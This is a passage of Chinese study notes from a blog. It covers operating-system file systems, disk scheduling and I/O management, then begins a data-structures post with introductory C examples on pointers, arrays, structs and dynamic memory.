文件的属性\n\n文件名：由创建文件的用于决定文件名，主要是为了方便用户找到文件，同一目录下不允许有重名文件。\n\n标识符：一个系统内的各文件标识符唯一，对用户来说毫无可读性，因此标识符只是操作系统用于区分各个文件的一种内部名称。\n\n类型：指明文件的类型。\n\n位置：文件的存放路径(让用户使用)、在外存中的地址(操作系统使用，对用户不可见)。\n\n大小：指明文件的大小。\n\n保护信息：对文件进行保护的访问控制信息。\n\n{% asset_img 4.1.png 文件内部组织 %}\n\n{% asset_img 4.1.1.png 操作系统给文件提供的功能 %}\n\n还有打开文件(open系统调用)和关闭文件(close系统调用)。读/写文件之前，需要“打开文件”，读/写文件结束之后，需要“关闭文件”。\n\n可用几个基本操作完成更复杂的操作，比如：“复制文件”，先创建一个新的空文件，再把源文件读入内存，再将内存中的数据写到新文件中。\n\n{% asset_img 4.1.2.png 文件存放在外存 %}\n\n## 4.2 文件的逻辑结构\n\n所谓的“逻辑结构”，就是指在用户看来，文件内部的数据应该是如何组织起来的。而“物理结构”指的是在操作系统看来，文件的数据是如何存放在外存中的。\n\n{% asset_img 4.2.1.png 有结构文件 %}\n\n根据有结构文件中的各条记录在逻辑上如何组织，可以分为三类：顺序文件、索引文件、索引顺序文件。\n\n### 4.2.1 顺序文件\n\n{% asset_img 4.2.2.png 顺序文件 %}\n\n{% asset_img 4.2.3.png 顺序文件 %}\n\n### 4.2.2 索引文件\n\n{% asset_img 4.2.4.png 索引文件 %}\n\n### 4.2.3 索引顺序文件\n\n{% asset_img 4.2.5.png 索引顺序文件 %}\n\n{% asset_img 4.2.6.png 索引顺序文件 %}\n\n{% asset_img 4.2.7.png 索引顺序文件 %}\n\n## 4.3 文件目录\n\n目录文件中的一条记录就是一个“文件控制块(FCB)”，FCB的有序集合称为“文件目录”。FCB中包含了文件的基本信息(文件名、物理地址、逻辑结构、物理结构等)，存取控制信息(是否可读/可写、禁止访问的用户名单等)，使用信息(如文件的建立时间、修改时间等)。FCB实现了文件名和文件之间的映射，使用户(用户程序)可以实现“按名存取”。所以最重要、最基本的还是文件名、文件存放的物理地址。\n\n### 4.3.1 对目录的操作\n\n搜索：当用户要使用一个文件时，系统要根据文件名搜索目录，找到该文件对应的目录项。\n\n创建文件：创建一个新文件时，需要在其所属的目录中增加一个目录项。\n\n删除文件：当删除一个文件时，需要在目录中删除相应的目录项。\n\n显示目录：用户可以请求显示目录的内容，如显示该目录中的所有文件及相应属性。\n\n修改目录：某些文件属性保存在目录中，因此这些属性变化时需要修改相应的目录项(如：文件重命名)。\n\n### 4.3.2 单级目录结构\n\n{% asset_img 4.3.2.png 单级目录结构 %}\n\n### 4.3.3 两级目录结构\n\n{% asset_img 4.3.3.png 两级目录结构 %}\n\n### 4.3.4 多级目录结构\n\n{% asset_img 4.3.4.png 多级目录结构 %}\n\n{% asset_img 4.3.5.png 多级目录结构 %}\n\n树形目录结构可以很方便地对文件进行分类，层次结构清晰，也能够更有效地进行文件的管理和保护。但是，树形结构不便于实现文件的共享。为此，提出了“无环图目录结构”。\n\n### 4.3.5 无环图目录结构\n\n{% asset_img 4.3.6.png 无环图目录结构 %}\n\n### 4.3.6 FCB的改进\n\n{% asset_img 4.3.7.png FCB的改进 %}\n\n当找到文件名对应的目录项时，才需要将索引节点调入内存，索引节点中记录了文件的各种信息，包括文件在外存中的存放位置，根据“存放位置”即可找到文件。\n\n存放在外存中的索引节点称为“磁盘索引节点”，当索引节点放入内存后称为“内存索引节点”。相比之下，内存索引节点中需要增加一些信息，比如：文件是否被修改、此时有几个进程正在访问该文件等。\n\n## 4.4 文件的物理结构(文件分配方式)\n\n{% asset_img 4.4.1.png 文件块和磁盘块 %}\n\n### 4.4.1 连续分配\n\n连续分配方式要求每个文件在磁盘上占有一组连续的块。\n\n{% asset_img 4.4.2.png 连续分配 %}\n\n读取某个磁盘块时，需要移动磁头。访问的两个磁盘块相隔越远，移动磁头所需时间就越长。\n\n结论：连续分配的文件在顺序读/写时速度最快。\n\n{% asset_img 4.4.3.png 连续分配 %}\n\n{% asset_img 4.4.4.png 连续分配 %}\n\n优点：支持顺序访问和直接访问(即随机访问)；连续分配的文件在顺序访问时速度最快。\n\n缺点：不方便文件拓展；存储空间利用率低，会产生磁盘碎片。\n\n### 4.4.2 链式分配\n\n链式分配采取离散分配的方式，可以为文件分配离散的磁盘块。分为隐式链接和显式链接两种。\n\n#### 4.4.2.1 隐式链接\n\n隐式链接：除文件的最后一个盘块之外，每个盘块中都存有指向下一个盘块的指针。文件目录包括文件第一块的指针和最后一块指针。\n\n{% asset_img 4.4.2.1.png 隐式链接 %}\n\n{% asset_img 4.4.2.2.png 隐式链接 %}\n\n优点：很方便文件拓展，不会有碎片问题，外存利用率高。\n\n缺点：只支持顺序访问，不支持随机访问，查找效率低，指向下一个盘块的指针也需要耗费少量的存储空间。\n\n#### 4.4.2.2 显式链接\n\n显式链接：把用于链接文件各物理块的指针显式地存放在一张表中，即文件分配表(FAT File Allocation Table)。一个磁盘只会建立一张文件分配表。开机时文件分配表放入内存，并常驻内存。\n\n{% asset_img 4.4.2.3.png 显式链接 %}\n\n{% asset_img 4.4.2.4.png 显式链接 %}\n\n优点：很方便文件拓展，不会有碎片问题，外存利用率高，并且支持随机访问。相比于隐式链接来说，地址转换时不需要访问磁盘，因此文件的访问效率更高。\n\n缺点：文件分配表需要占用一定的存储空间。\n\n### 4.4.3 索引分配\n\n{% asset_img 4.4.3.1.png 索引分配 %}\n\n如何实现文件的逻辑块号到物理块号的转换？\n\n用户给出要访问的逻辑块号i操作系统找到该文件对应的目录项(FCB)。从目录项中可知索引表存放位置，将索引表从外存读入内存，并查找索引表即可知道i号逻辑块在外存中的存放位置。\n\n可见，索引分配方式可以支持随机访问。文件拓展也很容易实现(只需要给文件分配一个空闲块，并增加一个索引表项即可)，但是索引表需要占用一定的存储空间。\n\n若每个磁盘块1KB，一个索引表项4B，则一个磁盘块只能存放1KB/4B=256个索引项。如果一个文件的大小超过了256块，那么一个磁盘块是装不下文件的整张索引表的，如何解决这个问题？\n\n方法一：链接方案\n\n{% asset_img 4.4.3.2.png 链接方案 %}\n\n方法二：多层索引\n\n{% asset_img 4.4.3.3.png 多层索引 %}\n\n方法三：混合索引\n\n{% asset_img 4.4.3.4.png 混合索引 %}\n\n## 4.5 文件存储空间管理\n\n{% asset_img 4.5.1.png 存储空间的划分 %}\n\n### 4.5.1 空闲表法\n\n{% asset_img 4.5.2.png 空闲表法 %}\n\n### 4.5.2 空闲链表法\n\n{% asset_img 4.5.3.png 空闲链表法 %}\n\n{% asset_img 4.5.4.png 空闲链表法 %}\n\n{% asset_img 4.5.5.png 空闲链表法 %}\n\n### 4.5.3 位示图法\n\n{% asset_img 4.5.6.png 位示图法 %}\n\n如何分配：若文件需要K个块，①顺序扫描位示图，找到K个相邻或不相邻的“0”；②根据字号、位号算出对应的盘块号，将相应盘块分配给文件；③将相应位设置为“1”。\n\n如何回收：①根据回收的盘块号计算出对应的字号、位号；②将相应二进制位设为“0”。\n\n位示图法连续分配、离散分配都适用。\n\n### 4.5.4 成组链接法\n\n{% asset_img 4.5.7.png 成组链接法 %}\n\n{% asset_img 4.5.8.png 成组链接法 %}\n\n{% asset_img 4.5.9.png 成组链接法 %}\n\n{% asset_img 4.5.10.png 成组链接法 %}\n\n## 4.6 文件的基本操作\n\n### 4.6.1 创建文件\n\n进行create系统调用时，需要提供的几个主要参数：\n\n1. 所需的外存空间大小(如：一个盘块，即1KB)\n2. 文件存放路径(“D:\\Demo”)\n3. 文件名(默认为“新建文本文档.txt”)\n\n操作系统在处理create系统调用时，主要做了两件事：\n\n1. 在外存中找到文件所需的空间(结合4.5，找到空闲空间)\n2. 根据文件存放路径的信息找到该目录对应的目录文件(“D:\\Demo”)，在目录中创建该文件对应的目录项。目录项中包含了文件名、文件在外存中的存放位置等信息\n\n### 4.6.2 删除文件\n\n进行delete系统调用时，需要提供的几个主要参数：\n\n1. 文件存放路径(“D:\\Demo”)\n2. 文件名(“test.txt”)\n\n操作系统在处理delete系统调用时，主要做了几件事：\n\n1. 根据文件存放路径找到相应的目录文件，从目录中找到文件名对应的目录项\n2. 根据该目录项记录的文件在外存的存放位置、文件大小等信息，回收文件占用的磁盘块(回收磁盘块时，根据空闲表法、空闲链表法、位图法等管理策略的不同，需要做不同的处理)\n3. 从目录表中删除文件对应的目录项\n\n### 4.6.3 打开文件\n\n在很多操作系统中，在对文件进行操作之前，要求用户先使用open系统调用“打开文件”，需要提供的几个主要参数：\n\n1. 文件存放路径(“D:\\Demo”)\n2. 文件名(“test.txt”)\n3. 要对文件的操作类型(如：r只读；rw读写等)\n\n操作系统在处理open系统调用时，主要做了几件事：\n\n1. 根据文件存放路径找到相应的目录文件，从目录中找到文件名对应的目录项，并检查该用户是否有特定的操作权限\n2. 将目录项复制到内存中的“打开文件表”中。并将对应表目的编号返回给用户。之后用户使用打开文件表的编号来指明要操作的文件\n\n{% asset_img 4.6.3.png 打开文件 %}\n\n### 4.6.4 关闭文件\n\n{% asset_img 4.6.4.png 关闭文件 %}\n\n### 4.6.5 读文件\n\n{% asset_img 4.6.5.png 读文件 %}\n\n### 4.6.6 写文件\n\n{% asset_img 4.6.6.png 写文件 %}\n\n## 4.7 文件共享\n\n{% asset_img 4.7.1.png 文件共享 %}\n\n### 4.7.1 基于索引节点的共享方式(硬链接)\n\n{% asset_img 4.7.2.png 硬链接 %}\n\n### 4.7.2 基于符号链的共享方式(软链接)\n\n{% asset_img 4.7.3.png 软链接 %}\n\n由于用软链接的方式访问共享文件时要查询多级目录，会有多次磁盘I/O，因此用软链接访问比硬链接速度慢。\n\n## 4.8 文件保护\n\n### 4.8.1 口令保护\n\n{% asset_img 4.8.1.png 口令保护 %}\n\n### 4.8.2 加密保护\n\n{% asset_img 4.8.2.png 加密保护 %}\n\n### 4.8.3 访问控制\n\n{% asset_img 4.8.3.png 访问控制 %}\n\n{% asset_img 4.8.4.png 访问控制 %}\n\n## 4.9 文件系统的层次结构\n\n{% asset_img 4.9.1.png 文件系统的层次结构 %}\n\n{% asset_img 4.9.2.png 文件系统的层次结构 %}\n\n## 4.10 磁盘的结构\n\n磁盘的表面由一些磁性物质组成，可以用这些磁性物质来记录二进制数据。磁盘的盘面被划分成一个个磁道。一个磁道又被划分成一个个扇区，每个扇区就是一个“磁盘块”，各个扇区存放的数据量相同(如1KB)。\n\n最内侧磁道上的扇区面积最小，因此数据密度最大。\n\n{% asset_img 4.10.7.png 磁盘的物理地址 %}\n\n{% asset_img 4.10.7.png 磁盘的分类 %}\n\n盘片可以更换的称为可换盘磁盘；不可更换的称为固定盘磁盘。\n\n## 4.11 磁盘调度算法\n\n磁盘调度算法是为了提高磁盘的访问性能，一般是通过优化磁盘的访问请求顺序来做的。其中寻道是磁盘较为耗时的部分，因此如果请求顺序得当，可以节省一些不必要的寻道时间。\n\n{% asset_img 4.10.png 磁盘读写需要的时间 %}\n\n### 4.11.1 先来先服务算法(FCFS)\n\n{% asset_img 4.10.1.png 先来先服务算法 %}\n\n### 4.11.2 最短寻找时间优先(SSTF)\n\n{% asset_img 4.10.2.png 最短寻找时间优先 %}\n\n### 4.11.3 扫描算法(SCAN)\n\n{% asset_img 4.10.3.png 扫描算法 %}\n\n### 4.11.4 LOOK调度算法\n\n{% asset_img 4.10.4.png LOOK调度算法 %}\n\n### 4.11.5 循环扫描算法(C-SCAN)\n\n{% asset_img 4.10.5.png 循环扫描算法 %}\n\n### 4.11.6 C-LOOK调度算法\n\n{% asset_img 4.10.6.png C-LOOK调度算法 %}\n\n## 4.12 减少磁盘延迟时间的方法\n\n{% asset_img 4.11.1.png 磁盘读写需要的时间 %}\n\n### 4.12.1 交替编号\n\n若采用交替编号的策略，即让逻辑上相邻的扇区在物理上有一定的间隔，可以使读取连续的逻辑扇区所需要的延迟时间更小。\n\n### 4.12.2 错位命名\n\n{% asset_img 4.11.5.png 错位命名 %}\n\n{% asset_img 4.11.6.png 错位命名 %}\n\n### 4.12.3 磁盘地址结构的设计\n\n{% asset_img 4.11.2.png 磁盘地址结构的设计 %}\n\n{% asset_img 4.11.3.png 磁盘地址结构的设计 %}\n\n{% asset_img 4.11.4.png 磁盘地址结构的设计 %}\n\n## 4.13 磁盘的管理\n\n{% asset_img 4.12.1.png 磁盘初始化 %}\n\n{% asset_img 4.12.2.png 引导块 %}\n\n{% asset_img 4.12.3.png 坏块 %}\n\n# 5. I/O\n\n## 5.1 I/O设备基本概念\n\nI/O就是输入/输出。I/O设备就是可以将数据输入到计算机，或者可以接收计算机输出数据的外部设备，属于计算机中的硬件部件。\n\nUNIX系统将外部设备抽象为一种特殊的文件，用户可以使用与文件操作相同的方式对外部设备进行操作。\n\nWrite操作：向外部设备写出数据。\n\nRead操作：从外部设备读入数据。\n$$\nI/O设备按使用特性分类\\begin{cases}人机交互类外部设备：数据传输速度慢\\\\\\\\\n存储设备：数据传输速度快\\\\\\\\\n网络通信设备：数据传输速度介于上述二者之间\\end{cases}\n$$\n人机交互类外设：鼠标、键盘、打印机等——用于人机交互\n\n存储设备：移动硬盘、光盘等——用于数据存储\n\n网络通信设备：调制解调器等——用于网络通信\n\n{% asset_img 5.1.1.png I/O设备分类 %}\n\n{% asset_img 5.1.2.png I/O设备分类 %}\n\n## 5.2 I/O控制器\n\nI/O设备的机械部件主要用来执行具体的I/O操作。如我们看得见摸得着的鼠标/键盘的按钮；显示器的LED屏；移动硬盘的磁臂、磁盘盘面。\n\nI/O设备的电子部件通常是一块插入主板扩充槽的印刷电路板。\n\n{% asset_img 5.2.1.png I/O控制器 %}\n\n{% asset_img 5.2.2.png I/O控制器的组成 %}\n\n值得注意的小细节：\n\n1. 一个I/O控制器可能会对应多个设备\n2. 数据寄存器、控制寄存器、状态寄存器可能有多个(如：每个控制/状态寄存器对应一个具体的设备)，且这些寄存器都要有相应的地址，才能方便CPU操作。有的计算机会让这些寄存器占用内存地址的一部分，称为内存映像I/O；另一些计算机则采用I/O专用地址，即寄存器独立编址\n\n{% asset_img 5.2.3.png 两种寄存器编制方式 %}\n\n## 5.3 I/O控制方式\n\n{% asset_img 5.3.png I/O控制方式 %}\n\n### 5.3.1 程序直接控制方式\n\n{% asset_img 5.3.1.png 程序直接控制方式 %}\n\n{% asset_img 5.3.2.png 程序直接控制方式 %}\n\n### 5.3.2 中断驱动方式\n\n{% asset_img 5.3.3.png 中断驱动方式 %}\n\n{% asset_img 5.3.4.png 中断驱动方式 %}\n\n### 5.3.3 DMA方式\n\n{% asset_img 5.3.5.png DMA方式 %}\n\n{% asset_img 5.3.6.png DMA方式 %}\n\n{% asset_img 5.3.7.png DMA方式 %}\n\n### 5.3.4 通道控制方式\n\n{% asset_img 5.3.8.png 通道控制方式 %}\n\n{% asset_img 5.3.9.png 通道控制方式 %}\n\n## 5.4 I/O软件层次结构\n\n{% asset_img 5.4.png I/O软件层次结构 %}\n\n### 5.4.1 用户层软件\n\n{% asset_img 5.4.1.png 用户层软件 %}\n\n假脱机技术(SPOOLing技术)在用户层软件实现。\n\n### 5.4.2 设备独立性软件\n\n设备独立性软件，又称设备无关性软件。与设备的硬件特性无关的功能几乎都在这一层实现。\n\n主要实现的功能：\n\n1. 向上层提供统一的调用接口(如read/write系统调用)\n2. 设备的保护(原理类似于文件保护)\n3. 差错处理\n4. 设备的分配与回收\n5. 数据缓冲区管理，可以通过缓冲技术屏蔽设备之间数据交换单位大小和传输速度的差异\n6. 建立逻辑设备名到物理设备名的映射关系；根据设备类型选择调用相应的驱动程序\n\n设备独立性软件需要通过“逻辑设备表(LUT，Logical Unit Table)”来确定逻辑设备对应的物理设备，并找到该设备对应的设备驱动程序。\n\n操作系统可以采用两种方式管理逻辑设备表：\n\n第一种方式，整个系统只设置一张LUT，这就意味着所有用户不能使用相同的逻辑设备名，因此这种方式只适用于单用户操作系统。\n\n第二种方式，为每个用户设置一张LUT，各个用户使用的逻辑设备名可以重复，适用于多用户操作系统。系统会在用户登录时为其建立一个用户管理进程，而LUT就存放在用户管理进程的PCB中。\n\n### 5.4.3 设备驱动程序\n\n{% asset_img 5.4.3.png 设备驱动程序 %}\n\n### 5.4.4 中断处理程序\n\n{% asset_img 5.4.4.png 中断处理程序 %}\n\nI/O核心子系统提供的功能：I/O调度、设备保护、设备分配与回收、缓冲区管理(即缓冲与高速缓存)。\n\n### 5.4.5 硬件\n\n执行I/O操作，由机械部件、电子部件组成。(看5.2)\n\n## 5.5 假脱机技术\n\n脱机——脱离主机的控制进行的输入/输出操作。\n\n{% asset_img 5.5.1.png 输入井和输出井 %}\n\n{% asset_img 5.5.2.png 输入输出缓冲区 %}\n\n独占式设备——只允许各个进程串行使用的设备。一段时间内只能满足一个进程的请求。\n\n共享设备——允许多个进程“同时”使用的设备(宏观上同时使用，微观上可能是交替使用)。可以同时满足多个进程的使用请求。\n\n打印机是种“独占式设备”，但是可以用SPOOLing技术改造成“共享设备”。\n\n独占式设备的例子：若进程1正在使用打印机，则进程2请求使用打印机时必然阻塞等待。\n\n{% asset_img 5.5.3.png 共享打印机 %}\n\n{% asset_img 5.5.4.png 共享打印机 %}\n\n## 5.6 设备的分配与回收\n\n虚拟设备——采用SPOOLing技术将独占设备改造成虚拟的共享设备，可同时分配给多个进程使用(如采用SPOOLing技术实现的共享打印机)\n\n从进程运行的安全性上考虑，设备分配有两种方式：\n\n- 安全分配方式：为进程分配一个设备后就将进程阻塞，本次I/O完成后才将进程唤醒\n\n  一个时段内每个进程只能使用一个设备\n\n  优点：破坏了“请求和保持”条件，不会死锁\n\n  缺点：对于一个进程来说，CPU和I/O设备只能串行工作\n\n- 不安全分配方式：进程发出I/O请求后，系统为其分配I/O设备，进程可继续执行，之后还可以发出新的I/O请求。只有某个I/O请求得不到满足时才将进程阻塞\n\n  一个进程可以同时使用多个设备\n\n  优点：进程的计算任务和I/O任务可以并行处理，使进程迅速推进\n\n  缺点：有可能发生死锁(死锁避免、死锁的检测和解除)\n\n静态分配：进程运行前为其分配全部所需资源，运行结束后归还资源。破坏了“请求和保持”条件，不会发生死锁。\n\n动态分配：进程运行过程中动态申请设备资源。\n\n### 5.6.1 设备分配管理中的数据结构\n\n{% asset_img 5.6.1.png 设备分配管理中的数据结构 %}\n\n{% asset_img 5.6.2.png 设备分配管理中的数据结构 %}\n\n{% asset_img 5.6.3.png 设备分配管理中的数据结构 %}\n\n{% asset_img 5.6.4.png 设备分配管理中的数据结构 %}\n\n{% asset_img 5.6.5.png 设备分配管理中的数据结构 %}\n\n### 5.6.2 设备分配的步骤\n\n1. 根据进程请求的物理设备名找到SDT(注：物理设备名是进程请求分配设备时提供的参数)\n2. 根据SDT找到DCT，若设备忙碌则将进程PCB挂到设备等待队列中，不忙碌则将设备分配给进程\n3. 根据DCT找到COCT，若控制器忙碌则将进程PCB挂到控制器等待队列中，不忙碌则将控制器分配给进程\n4. 根据COCT找到CHCT，若通道忙碌则将进程PCB挂到通道等待队列中，不忙碌则将通道分配给进程\n\n注：只有设备、控制器、通道三者都分配成功时，这次设备分配才算成功，之后便可启动I/O设备进行数据传送。\n\n缺点：\n\n①用户编程时必须使用“物理设备名”，底层细节对用户不透明，不方便编程；\n\n②若换了一个物理设备，则程序无法运行；\n\n③若改进请求的物理设备正在忙碌，则即使系统中还有同类型的设备，进程也必须阻塞等待。\n\n改进方法：建立逻辑设备名与物理设备名的映射机制，用户编程时只需提供逻辑设备名。\n\n1. 根据进程请求的逻辑设备名找到SDT(注：用户编程时提供的逻辑设备名其实就是“设备类型”)\n2. 查找SDT，找到用户进程指定类型的、并且空闲的设备，将其分配给该进程。操作系统在逻辑设备表(LUT)中新增一个表项\n3. 根据DCT找到COCT，若控制器忙碌则将进程PCB挂到控制器等待队列中，不忙碌则将控制器分配给进程\n4. 根据COCT找到CHCT，若通道忙碌则将进程PCB挂到通道等待队列中，不忙碌则将通道分配给进程\n\n逻辑设备表(LUT)建立了逻辑设备名与物理设备名之间的映射关系。如果之后用户进程再次通过相同的逻辑设备名请求使用设备，则操作系统通过LUT表即可知道用户进程实际要使用的是那个物理设备了，并且也能知道该设备的驱动程序入口地址。\n\n逻辑设备表的设置问题：\n\n整个系统只有一张LUT：各用户所用的逻辑设备名不允许重复，适用于单用户操作系统。\n\n每个用户一张LUT：不同用户的逻辑设备名可重复，适用于多用户操作系统。\n\n## 5.7 缓冲区管理\n\n{% asset_img 5.7.1.png 缓冲区管理 %}\n\n{% asset_img 5.7.2.png 缓冲区管理 %}\n\n### 5.7.1 单缓冲\n\n{% asset_img 5.7.3.png 单缓冲 %}\n\n### 5.7.2 双缓冲\n\n{% asset_img 5.7.4.png 双缓冲 %}\n\n{% asset_img 5.7.5.png 双缓冲 %}\n\n结论：采用双缓冲策略，处理一个数据块的平均耗时为$\\max(T,C+M)$。\n\n### 5.7.3 单/双缓冲区的区别\n\n{% asset_img 5.7.6.png 单/双缓冲 %}\n\n{% asset_img 5.7.7.png 单/双缓冲 %}\n\n### 5.7.4 循环缓冲区\n\n{% asset_img 5.7.8.png 循环缓冲区 %}\n\n### 5.7.5 缓冲池\n\n{% asset_img 5.7.9.png 缓冲池 %}\n\n","categories":["基础知识"]},{"title":"数据结构","url":"/posts/79666db.html","content":"\n呜呜呜笔试的痛，基础一定要打好啊！要不然就像我一样要把知识重新捡回来了。我大一学数据结构就是跟着郝斌老师学的，非常nice！[【郝斌】数据结构入门](https://www.bilibili.com/video/BV11s41167h6?p=1)\n\n由于郝斌老师的视频不完整，所以我又找了 [数据结构与算法基础（青岛大学-王卓）](https://www.bilibili.com/video/BV1nJ411V7bd?p=63) 补上缺的那部分的知识。\n\n记笔记记到一半上来感慨一下，绝了姐妹们！温故而知新，我把之前学的知识串通起来了！\n\n<!--more-->\n\n# 1. 预备知识\n\n**数据结构定义**： 我们如何把现实中大量而复杂的问题以特定的数据类型和特定的存储结构保存到主存储器(内存)中，以及在此基础上为实现某个功能(比如查找、删除、排序)而执行的相应操作，这个相应的操作也就是算法。\n\n数据结构 = 个体 + 个体的关系\n\n算法 = 对存储数据的操作\n\n程序 = 数据结构 + 算法\n\n**衡量算法的标准**：\n\n1. 时间复杂度：程序要执行的次数，而非确定时间\n2. 空间复杂度：算法执行过程中所占用的最大内存\n3. 难易程度\n4. 健壮性\n\n## 1.1 指针\n\n地址：内存单元的编号，范围从00000000 -- FFFFFFFF（0~4G-1）。\n\n指针：指针(*p)就是地址，地址就是指针。指针变量(p)是存放内存单元地址的变量。指针的本质是一个操作受限的非负整数。指针不等于指针变量。所有指针变量只占4个字节。\n\n变量：给地址起了个别名。\n\n```c\n#include <stdio.h>\nint main(void)\n{\n    int *p;\t\t//p是个指针变量，int *表示p变量只能存储int类型变量的地址\n    int j = 10;\n    int i;\n    char ch = 'A';\n    \n    //j = *p;\t//*p是野指针，因为没有被初始化\n    //p = &ch;\t//数据类型不一致\n    p = &j;\n    *p = j;\t\t//等价于j = j;\n    i = *p;\n    int *q = &j;\n    printf(\"i = %d, j = %d, *p = %d, *q = %d\\n\", i, j, *p, *q);\n    \n    return 0;\n}\n/**\ni = 10, j = 10, *p = 10, *q = 10\n*/\n```\n\n{% asset_img 1.1.jpg 指针 %}\n\n```c\n#include <stdio.h>\n\nvoid f(int i)\n{\n    i = 100;\n}\n\nint main(void)\n{\n    int i = 9;\n    f(i);\n    printf(\"i = %d\\n\", i);\n}\n/**\ni = 9\n*/\n```\n\n```c\n#include <stdio.h>\n\nvoid f(int *i)\n{\n    *i = 100;\n}\n\nint main(void)\n{\n    int i = 9;\n    f(&i);\n    printf(\"i = %d\\n\", i);\n}\n/**\ni = 100\n*/\n```\n\n{% asset_img 1.1.2.jpg 指针 %}\n\n```c\n#include <stdio.h>\n\nvoid f(int **q)\n{\n    **q = 100;\n    *q = (int *)0xFFFFFFFF;\n}\n\nint main(void)\n{\n    int i = 9;\n    int *p = &i;\n    printf(\"%p\\n\", p);\t\t//p变量存的内容以地址的形式输出，也就是打印i的地址\n    //printf(\"%p\\n\", &p);\t//打印p变量的地址\n    f(&p);\n    printf(\"i = %d, p = %p\\n\", i, p);\n}\n/**\n0101F86C\ni = 100, p = FFFFFFFF\n*/\n```\n\n{% asset_img 1.1.3.jpg 指针 %}\n\n## 1.2 数组\n\n```c\n#include <stdio.h>\n\nint main()\n{\n    int a[5] = {1,2,3,4,5};\t\t//a[i] == *(a+i) == *(i+a) == i[a]\n    printf(\"%p\\n\", a + 1);\n    printf(\"%p\\n\", a + 2);\n    printf(\"%d\\n\", *a + 3);\t\t//*a+3 == a[0]+3\n    return 0;\n}\n/**\n0056FB1C\n0056FB20\n4\n*/\n```\n\n{% asset_img 1.2.1.jpg 数组 %}\n\n```c\n#include <stdio.h>\n\nvoid Show_Array(int *p, int len)\n{\n    p[2] = -1;\n    for(int i=0; i<len; i++)\n        printf(\"%d \", p[i]);\n}\n\nint main()\n{\n    int a[5] = {1,2,3,4,5};\n    Show_Array(a, 5);\t\t//a等价于&a[0],&a[0]本身就是int *类型\n}\n/**\n1 2 -1 4 5\n*/\n```\n\n{% asset_img 1.2.2.jpg 数组 %}\n\n## 1.3 结构体\n\n为什么会出现结构体：为了表示一些复杂的数据，而普通的基本类型变量无法满足要求。\n\n**结构体定义**：结构体是用户根据实际需要自己定义的复合数类型。\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nstruct Student\n{\n    int sid;\n    char name[20];\n    int age;\n};\n\nint main(void)\n{\n    struct Student st = {1000, \"zhangsan\", 20};\n    printf(\"%d %s %d\\n\", st.sid, st.name, st.age);\n    st.sid = 2000;\n    //st.name = \"lisi\";\t\t//name是个数组指针变量，左右数据类型不一致\n    strcpy(st.name, \"lisi\");\n    st.age = 21;\n    printf(\"%d %s %d\\n\", st.sid, st.name, st.age);\n    return 0;\n}\n/**\n1000 zhangsan 20\n2000 lisi 21\n*/\n```\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nstruct Student\n{\n    int sid;\n    char name[20];\n    int age;\n};\n\nint main(void)\n{\n    struct Student st;\t\t//类似于int i;\n    struct Student * pst;\t//类似于int *p;\n    pst = &st;\t\t\t\t//类似于p = &i;\n    pst->sid = 99;\t\t\t//类似于*p = 99;\n    //pst->sid等价于(*pst).sid等价于st.sid\n    //结构体指针变量后是\"->\"\n}    \n```\n\n注意事项：结构体变量不能进行算术运算，但是可以相互赋值；普通结构体变量和结构体指针变量作为函数传参的问题，推荐使用传递结构体指针的方式，这样效率高、节约内存。\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nstruct Student\n{\n    int sid;\n    char name[20];\n    int age;\n};\n\nvoid f(struct Student * pst)\n{\n    (*pst).sid = 99;\n    strcpy(pst->name, \"zhangsan\");\n    pst->age = 23;\n}\n\n/**\t\n//这种方式耗内存，耗时间，不推荐\nvoid g(struct Student st)\n{\n    printf(\"%d %s %d\\n\", st.sid, st.name, st.age);\n}\n*/\n\nvoid k(struct Student * pst)\n{\n    printf(\"%d %s %d\\n\", pst->sid, pst->name, pst->age);\n}\n\nint main(void)\n{\n    struct Student st;\n    f(&st);\n    //printf(\"%d %s %d\\n\", st.sid, st.name, st.age);\n    //g(st);\t\n    k(&st);\n    return 0;\n}\n```\n\n## 1.4 动态内存分配\n\n```c\n#include <stdio.h>\n#include <malloc.h>\n\nint main(void)\n{\n    //静态数组\n    int a[5] = {1,2,3,4,5};\n    \n    //动态数组\n    int len;\n    printf(\"请输入需要分配数组的长度：length = \");\n    scanf(\"%d\", &len);\t//将输入写到len变量这个地址中去\n    len = 5;\n    int * pArr = (int *)malloc(sizeof(int) * len);\n    *pArr = 4;\t\t\t//类似于a[0] = 4;\n    pArr[1] = 10;\t\t//类似于a[1] = 10;\n   \n    for(int i=0; i<len; i++)\n    {\n        pArr[i] = i * i;\n        printf(\"%p\\n\", &pArr[i]);\t//取动态数组的每个元素的地址并输出\n    }\n    free(pArr);\t\t\t//把pArr所代表的动态分配所有个字节的内存释放\n    \n    return 0;\n}\n/**\n//动态数组的地址也是连续的\n009F6B18\n009F6B1C\n009F6B20\n009F6B24\n009F6B28\n*/\n```\n\n{% asset_img 1.4.1.jpg malloc分配动态数组 %}\n\n## 1.5 跨函数使用内存\n\n```c\n#include <stdio.h>\n\nint f();\n\nint main(void)\n{\n    int i = 10;\n    i = f();\n    printf(\"i = %d\\n\", i);\n    \n    return 0;\n}\n\nint f()\n{\n    int j = 20;\n    return j;\n}\n/**\ni = 20\n*/\n```\n\n```c\n#include <stdio.h>\n\n/*\nvoid f(int **q)\n{\n    int s;\n    *q = &s;\n}\n*/\n\nvoid g(int **q)\n{\n    *q = (int *)malloc(sizeof(int));\n}\n\nint main(void)\n{\n    int *p;\n    //f(&p);\t//p调用完f()还是野指针，因为调用完f()，f()中的局部变量都没了\n    g(&p);\n}\n```\n\n```c\n#include <stdio.h>\n#include <malloc.h>\n\nstruct Student\n{\n    int sid;\n    int age;\n};\n\nstruct Student * CreateStudent();\nvoid ShowStudent(struct Student *);\n\nint main()\n{\n    struct Student * pst;\n    pst = CreateStudent();\n    ShowStudent(pst);\n}\n\nstruct Student * CreateStudent()\n{\n    struct Student * p = (struct Student *)malloc(sizeof(struct Student));\n    p->sid = 99;\n    p->age = 22;\n    return p;\n}\n\nvoid ShowStudent(struct Student * ps)\n{\n    printf(\"%d %d\\n\", ps->sid, ps->age);\n}\n/**\n99 22\n*/\n```\n\n# 2. 线性结构\n\n## 2.1 连续存储【数组】\n\n优点：存取速度快、方便查找\n\n缺点：事先知道数组的长度、插入删除元素慢、空间通常有限制、需要大块连续内存\n\n```c\n#include <stdio.h>\n#include <malloc.h>\n#include <stdlib.h>\n\nstruct Arr\n{\n    int* pBase;\t\t//存储的是数组第一个元素的地址\n    int len;\t\t//数组所能容纳的最大元素的个数\n    int 